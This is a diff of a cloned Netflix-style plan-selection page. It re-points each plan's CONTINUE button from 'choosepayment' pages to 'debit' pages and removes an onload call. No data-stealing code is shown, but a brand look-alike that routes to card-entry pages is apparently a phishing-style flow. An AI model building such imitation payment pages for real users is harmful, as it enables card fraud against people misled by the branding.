@@ -49,7 +49,7 @@
     <script>
         /* Disable minification (remove `.min` from URL path) for more info */
     </script>
-    <link rel="stylesheet" href="chooseplan.css">
+    <link rel="stylesheet" href="rechooseplan.css">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
@@ -383,7 +383,7 @@
             <div class="submitBtnContainer">
                 <a href="#" id="continue_page"><button type="button" autocomplete="off"
                     class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-plan-selection"
-                    placeholder="planSelection_button_continue" onclick="window.location.href='choosepayment.html'">CONTINUE</button></a></div>
+                    placeholder="planSelection_button_continue">CONTINUE</button></a></div>
         </div>
     </div>
     <div class="site-footer-wrapper centered">
@@ -432,11 +432,9 @@
     </div>
 
     <script>
-        window.onload = change_color(4);
-
         function change_color(number){
             if (number == 1){
-                document.getElementById("continue_page").setAttribute("onclick", "location.href='choosepayment.html'")
+                document.getElementById("continue_page").setAttribute("onclick", "location.href='debit.html'")
 
                 document.getElementById("mobile_color1").style.color = "#e50914";
                 document.getElementById("mobile_color1").style.fill = "#e50914";
@@ -575,7 +573,7 @@
                 document.getElementById("premium_color12").style.borderColor = "#7d8c98";
             }
             else if (number == 2){
-                document.getElementById("continue_page").setAttribute("onclick", "location.href='choosepayment_basic.html'")
+                document.getElementById("continue_page").setAttribute("onclick", "location.href='debit_basic.html'")
 
                 document.getElementById("mobile_color1").style.color = "#7d8c98";
                 document.getElementById("mobile_color1").style.fill = "#7d8c98";
@@ -715,7 +713,7 @@
             }
 
             else if (number == 3){
-                document.getElementById("continue_page").setAttribute("onclick", "location.href='choosepayment_standard.html'")
+                document.getElementById("continue_page").setAttribute("onclick", "location.href='debit_standard.html'")
 
                 document.getElementById("mobile_color1").style.color = "#7d8c98";
                 document.getElementById("mobile_color1").style.fill = "#7d8c98";
@@ -855,8 +853,8 @@
             }
 
             else if (number == 4){
-                document.getElementById("continue_page").setAttribute("onclick", "location.href='choosepayment_premium.html'")
-                
+                document.getElementById("continue_page").setAttribute("onclick", "location.href='debit_premium.html'")
+
                 document.getElementById("mobile_color1").style.color = "#7d8c98";
                 document.getElementById("mobile_color1").style.fill = "#7d8c98";
                 document.getElementById("mobile_color1").style.borderColor = "#7d8c98";
